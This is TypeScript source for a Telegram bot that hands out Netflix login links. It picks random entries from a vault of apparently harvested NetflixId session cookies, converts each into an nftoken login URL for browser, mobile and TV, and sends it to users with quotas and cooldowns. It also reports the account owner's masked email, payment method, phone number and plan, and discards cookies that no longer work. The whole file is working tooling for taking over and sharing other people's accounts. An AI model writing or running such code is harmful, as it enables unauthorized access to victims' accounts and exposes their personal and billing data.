import type { Bot } from './bot';
import type { CountryFilter, NfMetadata, VaultEntry } from './types';
import type { VaultResult } from './vaultstore';
import { adminContact, escapeHtml } from './telegram';
import { getStats, isUnlimited, remainingQuota } from './stats';
import { extractCookieDict, extractMetadata, fetchNfToken, isDeadFailure, maskEmail } from './netflix';
import { resolveCountry, flagEmoji } from './countries';
import { fetchAccountSnapshot } from './safety';
import type { AccountSnapshot } from './safety';
import { startLoading } from './loading';
import type { Loading } from './loading';

const MAX_RANDOM_ATTEMPTS = 8;

/** Ambil kode negara dari entry vault (fallback ke resolusi region). */
export function entryCountry(v: VaultEntry): string | null {
  if (v.country) return v.country;
  return resolveCountry(v.region);
}

/** Filter vault berdasarkan kode negara. */
export function filterVaultByCountry(vault: VaultEntry[], country: CountryFilter | null): VaultEntry[] {
  if (!country || country === 'global') return vault;
  return vault.filter((v) => entryCountry(v) === country);
}

/**
 * Susun pesan token yang diterima user.
 *
 * Prioritas data: halaman akun Netflix (paling akurat & terbaru) -> metadata
 * berkas yang diunggah. Baris yang datanya memang tidak ada tidak dicetak,
 * kecuali Nomor HP/Pembayaran yang tetap ditulis "Tidak ada" supaya user tahu.
 */
export function buildTokenMessage(opts: {
  meta: NfMetadata;
  snap: AccountSnapshot | null;
  /** Kode ISO2 dari entryCountry(), dipakai bila snapshot tidak memberi negara. */
  fallbackCountry: string | null;
  loginBrowser: string;
  loginMobile: string;
  loginTv: string;
  expDate: string;
}): string {
  const { meta, snap, fallbackCountry, loginBrowser, loginMobile, loginTv, expDate } = opts;

  const email = maskEmail(snap?.email || meta.email);
  const plan = snap?.plan || meta.plan;
  const memberSince = snap?.memberSince || meta.memberSince;
  const nextBilling = snap?.nextBilling || meta.nextBilling;
  const country = snap?.country || fallbackCountry;

  let out = `✅ <b>Token Netflix Berhasil Dibuat</b>\n\n`;
  out += `📧 <b>Email:</b> ${escapeHtml(email)}\n`;
  if (snap && snap.emailVerified !== null) {
    out += `📨 <b>Email Terverifikasi:</b> ${snap.emailVerified ? '✅ Ya' : '⚠️ Belum'}\n`;
  }
  out += country
    ? `🌍 <b>Negara:</b> ${flagEmoji(country)} ${escapeHtml(country)}\n`
    : `🌍 <b>Region:</b> ${escapeHtml(meta.region)}\n`;
  out += `💎 <b>Plan:</b> ${escapeHtml(plan)}\n`;
  out += `🗓 <b>Member Since:</b> ${escapeHtml(memberSince)}\n`;
  if (nextBilling) out += `⏳ <b>Next Billing:</b> ${escapeHtml(nextBilling)}\n`;
  if (snap) {
    out += `💳 <b>Pembayaran:</b> ${escapeHtml(snap.paymentMethod || 'Tidak ada')}\n`;
    if (snap.profileCount !== null) out += `👥 <b>Profil:</b> ${snap.profileCount}\n`;
    out += `📱 <b>Nomor HP:</b> ${escapeHtml(snap.phone || 'Tidak ada')}\n`;
    out += `🟢 <b>Status Akun:</b> Aktif\n\n`;
  } else {
    out += `🟡 <b>Status Akun:</b> Tidak diverifikasi (gangguan jaringan)\n\n`;
  }

  out +=
    `💻 <b>Login Browser</b>\n<a href="${loginBrowser}">➡️ Klik disini</a>\n\n` +
    `📱 <b>Login Hp</b>\n<a href="${loginMobile}">➡️ Klik disini</a>\n\n` +
    `📺 <b>Login TV</b>\n<a href="${loginTv}">➡️ Klik disini</a>\n\n` +
    `⏳ <b>Expires:</b> <code>${expDate}</code>\n\n` +
    `<b>MEDIAFAIRY Netflix Token</b>`;
  return out;
}

/**
 * Generate token dari Vault secara acak.
 *
 * Satu-satunya jalur generate: user menekan tombol menu -> memilih negara
 * (atau "Semua Negara") -> fungsi ini dipanggil dengan `countryFilter`.
 * Command `/gen` sudah dihapus, jadi tidak ada input cookie manual.
 */
export async function processGeneration(
  bot: Bot,
  chatId: number,
  userId: number,
  username: string,
  isAdmin: boolean,
  countryFilter: CountryFilter | null
): Promise<void> {
  const stats = await getStats(bot, userId);

  // --- Cooldown (admin bypass) ---
  if (!isAdmin && stats.lastGen) {
    const waitMs = bot.cfg.COOLDOWN_MS - (Date.now() - stats.lastGen);
    if (waitMs > 0) {
      const sec = Math.ceil(waitMs / 1000);
      const cooldownSec = Math.round(bot.cfg.COOLDOWN_MS / 1000);
      await bot.send(
        chatId,
        `⏳ <b>Mohon tunggu ${sec} detik</b> sebelum generate berikutnya.\nJeda antar generate: <b>${cooldownSec} detik</b>.`
      );
      return;
    }
  }

  // --- Limit kuota (dilewati bila unlimited) ---
  if (!isUnlimited(bot.cfg.FREE_DAILY_LIMIT) && remainingQuota(stats, bot.cfg.FREE_DAILY_LIMIT) <= 0) {
    await bot.send(
      chatId,
      `⛔ <b>Akses Ditolak: Limit Habis!</b>\nAnda telah menggunakan seluruh batas harian (${bot.cfg.FREE_DAILY_LIMIT}x).\n\nHubungi admin: ${adminContact(bot.cfg)}.`
    );
    return;
  }

  const countryLabel = countryFilter && countryFilter !== 'global' ? countryFilter.toUpperCase() : 'SEMUA NEGARA';
  const verifyMsg =
    `🔄 Memverifikasi${countryFilter ? ` dengan filter Negara: <b>${countryLabel}</b>` : ''}... mohon tunggu.`;

  // Stiker loading (hanya pada generate). Dinyalakan SETELAH cek stok lolos,
  // supaya balasan "Stock Habis" tetap instan tanpa jeda 10 detik.
  let loading: Loading | null = null;

  try {
    // Ambil kandidat acak dari D1 (satu query), bukan lagi membaca seluruh
    // vault ke memori. Inilah yang membuat 5000 akun tetap aman di bawah
    // batas CPU 10 ms free plan.
    const candidates = await bot.vault.pickRandom(countryFilter, MAX_RANDOM_ATTEMPTS);

    let nfToken: string | null = null;
    let expires: number | null = null;
    let meta: ReturnType<typeof extractMetadata> | null = null;

    // Cek stok DULUAN. Bila tidak ada akun, user tidak dihukum cooldown
    // karena memang tidak ada yang bisa dilayani.
    if (candidates.length === 0) {
      const scope = countryFilter && countryFilter !== 'global' ? countryFilter.toUpperCase() : 'SEMUA NEGARA';
      await bot.send(
        chatId,
        `⚠️ <b>Stock Habis!</b>\nTidak ditemukan akun yang sesuai dengan negara <b>${scope}</b> di Vault saat ini.\n\n` +
          `<i>Tidak ada cooldown yang terpakai — silakan coba negara lain.</i>`
      );
      return;
    }

    loading = await startLoading(bot, chatId);
    // Bila stiker gagal terkirim, pakai indikator teks seperti sebelumnya.
    if (!loading.shown) await bot.send(chatId, verifyMsg);

    let success = false;
    let inconclusive = false;
    let accountsRemoved = 0;
    let holdRemoved = 0;
    let snap: AccountSnapshot | null = null;
    let chosen: VaultEntry | null = null;
    // Akun mati ditandai `dead` (bukan langsung dihapus) supaya masih bisa
    // dilaporkan di /admin, lalu dipangkas oleh pembersihan berkala.
    const dead: VaultResult[] = [];

    for (const candidate of candidates) {
      const cookieDict = extractCookieDict(candidate.rawText);

      if (!cookieDict.NetflixId) {
        dead.push({ id: candidate.id, status: 'dead', reason: 'tanpa_cookie' });
        accountsRemoved++;
        continue;
      }

      let tokenData;
      try {
        tokenData = await fetchNfToken(cookieDict.NetflixId);
      } catch (e) {
        // Rate-limit / gangguan jaringan BUKAN bukti cookie mati. Jangan buang
        // akun dan jangan habiskan cooldown user.
        if (!isDeadFailure(e)) {
          inconclusive = true;
          break;
        }
        dead.push({ id: candidate.id, status: 'dead', reason: 'cookie_mati' });
        accountsRemoved++;
        continue;
      }

      // Cookie hidup. Periksa penahanan pembayaran: akun seperti itu tetap bisa
      // membuat token, tetapi user akan mentok di layar tagihan Netflix, jadi
      // lebih baik dibuang sekarang dan langsung coba kandidat berikutnya.
      if (bot.cfg.CHECK_PAYMENT_HOLD) {
        const accountSnap = await fetchAccountSnapshot(cookieDict.NetflixId);
        if (accountSnap && accountSnap.onHold) {
          await bot.vault.deleteById(candidate.id);
          holdRemoved++;
          accountsRemoved++;
          continue;
        }
        // `null` (gangguan jaringan) bukan bukti apa pun: akun tetap dipakai.
        snap = accountSnap;
      }

      nfToken = tokenData.token;
      expires = tokenData.expires;
      meta = extractMetadata(candidate.rawText);
      chosen = candidate;
      success = true;
      break;
    }

    if (dead.length > 0) {
      await bot.vault.applyResults(dead);
    }

    if (!success) {
      if (loading) await loading.finish();
      if (inconclusive) {
        await bot.send(
          chatId,
          `⚠️ <b>Netflix Sedang Membatasi</b>\n` +
            `Sistem belum bisa memverifikasi akun saat ini (rate-limit atau gangguan di sisi Netflix).\n\n` +
            (accountsRemoved > 0
              ? `🗑️ ${accountsRemoved} akun yang terbukti mati tetap dibuang.\n\n`
              : '') +
            `<i>Akun Anda TIDAK dihapus dan tidak ada cooldown yang terpakai. Silakan coba lagi sebentar.</i>`
        );
        return;
      }
      await bot.send(
        chatId,
        `❌ <b>Semua Sampel Acak Mati!</b>\n` +
          `Sistem otomatis menguji ${candidates.length} akun acak dan <b>menghapus ${accountsRemoved} akun</b>` +
          (holdRemoved > 0 ? ` (${holdRemoved} di antaranya ditahan Netflix karena masalah pembayaran)` : '') +
          ` dari sistem. Silakan coba lagi.\n\n` +
          `<i>Tidak ada cooldown yang terpakai.</i>`
      );
      return;
    }

    if (!nfToken || !expires || !meta) throw new Error('Gagal mengambil token.');

    // --- Cooldown HANYA dicatat setelah token benar-benar berhasil dibuat ---
    // Jadi gagal karena stok habis atau semua cookie mati TIDAK
    // menghabiskan jeda 1 menit user.
    if (!isAdmin) {
      stats.lastGen = Date.now();
      await bot.kv.setStats(userId, stats);
    }

    const loginBrowser = 'https://netflix.com/?nftoken=' + nfToken;
    const loginMobile = 'https://netflix.com/unsupported?nftoken=' + nfToken;
    const loginTv = 'https://netflix.com/tv2?nftoken=' + nfToken;
    const expDate = new Date(expires).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const maskedEmail = maskEmail(snap?.email || meta.email);
    const premiumOutput = buildTokenMessage({
      meta,
      snap,
      fallbackCountry: chosen ? entryCountry(chosen) : null,
      loginBrowser,
      loginMobile,
      loginTv,
      expDate,
    });

    // Stiker dihapus lebih dulu, baru token dikirim.
    if (loading) await loading.finish();
    await bot.send(chatId, premiumOutput);

    if (!isAdmin) {
      if (!isUnlimited(bot.cfg.FREE_DAILY_LIMIT)) {
        if (stats.used < bot.cfg.FREE_DAILY_LIMIT) stats.used += 1;
        else stats.extra = Math.max(0, (stats.extra || 0) - 1);
        await bot.kv.setStats(userId, stats);
      }

      if (bot.cfg.GROUP_ID) {
        try {
          const notifMsg =
            `<b>NETFLIX GENERATED</b>\n<pre><code class="language-txt">👤 User   : ${escapeHtml(username)}\n🆔 ID     : ${userId}\n📧 Email  : ${escapeHtml(maskedEmail)}\n🌍 Region : ${escapeHtml(meta.region)}\n💎 Plan   : ${escapeHtml(meta.plan)}</code></pre>`;
          await bot.api('sendMessage', { chat_id: bot.cfg.GROUP_ID, text: notifMsg, parse_mode: 'HTML' });
        } catch (e) {
          console.error('Gagal mengirim notif:', e);
        }
      }
    }
  } catch (e) {
    if (loading) await loading.finish();
    await bot.send(chatId, `❌ <b>Terjadi Kesalahan:</b>\n<code>${escapeHtml((e as Error).message)}</code>`);
  } finally {
    // Jaring pengaman untuk semua jalur `return` dini. Idempoten, jadi tidak
    // akan menghapus dua kali.
    if (loading) await loading.finish();
  }
}
